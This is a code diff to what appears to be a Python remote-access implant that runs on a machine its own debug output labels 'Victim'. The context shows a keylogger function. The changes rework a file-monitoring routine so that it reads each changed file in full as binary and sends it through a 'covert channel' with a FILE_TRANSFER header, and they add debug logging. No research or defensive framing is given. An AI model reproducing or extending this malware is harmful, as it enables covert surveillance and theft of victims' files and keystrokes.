@@ -149,6 +149,7 @@ def get_keylog():
 def monitor_file(path):
     """Monitor a single file for changes using polling or inotify."""
     # 尝试第一次 stat，如果失败就立刻发错误并退出
+    print(f"[DEBUG][Victim] monitor_file starting on {path}")
     try:
         last_mtime = os.path.getmtime(path)
     except Exception as e:
@@ -158,6 +159,7 @@ def monitor_file(path):
             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
             "content": f"File not accessible: {e}"
         }
+        print(f"[DEBUG][Victim] Sending MON_FILE_STARTED")
         send_covert_response((json.dumps(msg) + "\n").encode())
         return
     # 成功后，先发一条“监控已启动”消息
@@ -170,11 +172,12 @@ def monitor_file(path):
 
     # Simple polling loop
     while mon_file_path == path:
+        print(f"[DEBUG][Victim] polling {path}")
         try:
             mtime = os.path.getmtime(path)
         except Exception as e:
             mon_file_events.append(f"File {path} inaccessible: {e}")
-            # 文件变得不可访问时，也发 JSON 错误
+            print(f"[DEBUG][Victim] Exception during stat: {e}")
             msg = {
                 "type": "MON_FILE_ERROR",
                 "path": path,
@@ -185,23 +188,27 @@ def monitor_file(path):
             break
         if mtime != last_mtime:
             last_mtime = mtime
-            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            print(f"[DEBUG][Victim] Detected change in {path}, reading file")
+            # 1. 读取最新的完整二进制内容
             try:
-                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
+                with open(path, 'rb') as f:
+                    file_bytes = f.read()
             except Exception as e:
-                content = f"<ERROR reading file: {e}>"
+                print(f"[DEBUG][Victim] Error reading file: {e}")
+                err = f"ERROR reading file: {e}".encode()
+                send_covert_response(b"FILE_TRANSFER_ERROR:" + os.path.basename(path).encode() + b":" + err)
+                continue
 
-            msg = {
-                "type": "MON_FILE_MODIFIED",
-                "path": path,
-                "timestamp": ts,
-                "content": content
-            }
-            send_covert_response((json.dumps(msg) + "\n").encode())
+            # 2. 构造 header：FILE_TRANSFER:<basename>:
+            basename = os.path.basename(path)
+            header = f"FILE_TRANSFER:{basename}:".encode()
+            print(f"[DEBUG][Victim] Sending FILE_TRANSFER header `{header}` and {len(file_bytes)} bytes")
+
+            # 3. 通过隐蔽通道一次性发出 header + 二进制文件
+            send_covert_response(header + file_bytes)
 
         time.sleep(1)
-    # When mon_file_path is changed (stop or new path), thread will exit.
+    print(f"[DEBUG][Victim] monitor_file thread exiting for {path}")
 
 
 def monitor_directory(path):
